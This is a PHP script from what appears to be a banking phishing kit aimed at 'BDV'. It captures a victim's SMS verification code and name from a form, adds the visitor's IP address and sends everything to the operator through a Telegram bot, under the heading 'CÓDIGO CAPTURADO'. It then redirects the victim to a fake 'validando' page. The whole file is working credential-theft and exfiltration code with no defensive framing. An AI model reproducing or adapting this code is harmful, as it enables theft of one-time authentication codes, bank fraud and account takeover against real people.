<?php
// sms.php
error_reporting(0);
// Importamos la configuración de Telegram que definiste
require 'tgbroo.php'; 

// 2. OBTENER DATOS DEL FORMULARIO
$sms = isset($_POST['sms']) ? $_POST['sms'] : '';
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : ''; 

// Obtención de IP (puedes usar la lógica de Cloudflare si la necesitas como en user.php)
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

/**
 * Función para enviar notificaciones a Telegram
 */
function sendToTelegram($mensaje) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

// 3. CONSTRUCCIÓN DEL MENSAJE Y ENVÍO A TELEGRAM
if (!empty($sms)) {
    // Formateamos el mensaje con HTML para que sea legible en Telegram
    $msg = "<b>BDV 🔑 - CÓDIGO CAPTURADO</b>\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "<b>Usuario:</b> {$nombre}\n";
    $msg .= "<b>CÓDIGO:</b> {$sms}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━\n";
    $msg .= "<b>IP:</b> <code>{$ip}</code>\n";

    // Enviamos a Telegram
    sendToTelegram($msg);
}

// 4. REDIRIGIR AL SIGUIENTE PASO
header('Location: validando.html'); 
exit();
?>